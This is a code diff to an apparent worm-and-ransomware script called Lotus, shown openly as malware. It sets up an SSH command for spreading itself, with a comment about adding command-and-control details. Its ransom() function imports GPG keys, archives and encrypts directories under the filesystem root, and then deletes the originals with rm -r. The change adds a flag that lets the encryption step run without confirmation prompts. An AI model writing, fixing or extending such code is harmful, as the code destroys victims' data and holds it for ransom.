@@ -6,9 +6,6 @@ from subprocess import Popen, PIPE
 import base64
 from os import path
 import time
-import tkinter.messagebox
-import tkinter
-from tkinter import *
 ssh_command = "/Lotus/Lotus.py; exit"                                             ## Add command and control server info here, as well as running the worm itself.
 #cron = "* * * * * /Lotus/Lotus.py \n"
 
@@ -101,7 +98,7 @@ def ransom():
         subprocess.Popen(["gpg --batch --always-trust --passphrase '' --yes --import /Lotus/public.key"], shell=True)
         subprocess.Popen(["gpg --batch --always-trust --passphrase '' --yes --import /Lotus/secret.key"], shell=True)
         subprocess.run(['cd / ; tar czf ' + dir1 + '.tar.gz ' + dir1], shell=True)
-        subprocess.run(['cd / ; gpg -e -r encryptor ' + dir1 + '.tar.gz'], shell=True)
+        subprocess.run(['cd / ; gpg -e -r encryptor --trust-model always ' + dir1 + '.tar.gz'], shell=True)
         if path.exists('/' + dir1 + '.tar.gz.gpg' ) == True:
             subprocess.run(['rm -r /' + dir1], shell=True)
             subprocess.run(['rm /' + dir1 + '.tar.gz ' ], shell=True)
